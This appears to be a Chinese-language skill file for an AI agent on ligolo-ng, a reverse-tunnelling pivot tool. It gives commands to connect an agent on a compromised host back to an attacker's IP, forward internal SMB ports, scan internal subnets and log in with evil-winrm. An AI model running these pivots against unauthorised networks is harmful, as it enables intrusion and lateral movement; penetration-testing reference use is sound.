---
name: ligolo-ng
description: >
  此技能适用于用户询问关于"ligolo-ng"、"进入内网、通过被攻陷主机隧道传输流量、访问内部子网"、"在不使用 SOCKS proxychains 的情况下建立网络隧道"。反向隧道工具，通过在攻击者机器上创建 TUN 接口，经由被攻陷的中转主机将流量路由到内部网络。
---

# ligolo-ng

通过 TUN 接口进行反向隧道 — 比 SOCKS/proxychains 更简洁的内网穿透方案，工作在网络层。

## 架构

```
攻击者 (proxy)  ←—TLS 隧道—  受害中转主机 (agent)  ——→  内部网络
   [TUN 接口]                   [被攻陷主机]              192.168.1.0/24
```

无需 proxychains — 所有工具可直接对内部 IP 段使用。

## 快速开始

```bash
# 攻击者：创建 TUN 接口并启动 proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 中转主机（受害者）：将 agent 连接到 proxy
./agent -connect <attacker_ip>:11601 -ignore-cert

# 回到攻击者 proxy 控制台：
session          # 选择 agent 会话
start            # 开始隧道

# 在攻击者机器添加内部子网路由
sudo ip route add 192.168.1.0/24 dev ligolo
```

## Proxy 控制台命令

| 命令 | 说明 |
|------|------|
| `session` | 列出/选择活跃会话 |
| `start` | 为选定会话启动隧道 |
| `stop` | 停止隧道 |
| `ifconfig` | 显示远端接口/子网 |
| `listener_add` | 添加端口转发（agent→proxy） |
| `listener_list` | 列出活跃监听器 |
| `listener_stop` | 停止监听器 |

## 端口转发（Listener）

将内部服务暴露给攻击者：

```bash
# 在 proxy 控制台（选定会话后）：
listener_add --addr 0.0.0.0:4444 --to 192.168.1.5:445 --tcp
# 现在访问 attacker:4444 → 内部 192.168.1.5:445
```

## 常用工作流

```bash
# 完整内网穿透配置
# 步骤 1：启动 proxy（攻击者）
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# 步骤 2：在中转主机上运行 agent（通过 Web 服务器或已有 shell 上传）
# Linux 中转：
./agent -connect 10.10.14.1:11601 -ignore-cert &
# Windows 中转：
agent.exe -connect 10.10.14.1:11601 -ignore-cert

# 步骤 3：添加路由（攻击者）
# 在 proxy 控制台：
session          # ID: 1 - pivot-host
start
# 在终端：
sudo ip route add 10.200.1.0/24 dev ligolo

# 步骤 4：直接使用内部 IP
nmap -sS 10.200.1.0/24
nxc smb 10.200.1.0/24
evil-winrm -i 10.200.1.50 -u admin -p pass
```

## 双重内网穿透 (Double Pivot)

用于嵌套网络（攻击者 → 中转1 → 中转2 → 内部）：
- 在中转2 上运行第二个 agent，通过中转1 上的 listener 回连
- 添加第二个 TUN 接口和路由

## 参考资源

| 文件 | 加载时机 |
|------|----------|
| `references/pivot-setup.md` | 双重穿透、TLS 证书配置、agent 持久化、Windows 服务安装 |
